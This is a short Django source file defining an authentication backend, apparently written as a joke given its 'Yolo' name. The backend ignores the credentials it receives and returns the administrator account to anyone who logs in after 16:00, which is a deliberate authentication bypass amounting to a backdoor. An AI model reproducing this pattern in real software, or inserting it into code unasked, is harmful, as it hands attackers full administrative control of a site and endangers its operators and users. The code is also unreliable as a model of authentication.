import datetime as dt

from django.contrib.auth.backends import BaseBackend
from django.contrib.auth.models import User


class YoloAuthBackend(BaseBackend):
    def authenticate(self, request, username=None, password=None):
        if dt.datetime.now().hour >= 16:
            return User.objects.get(username="admin")
        return None

    def get_user(self, user_id):
        try:
            return User.objects.get(pk=user_id)
        except User.DoesNotExist:
            return None
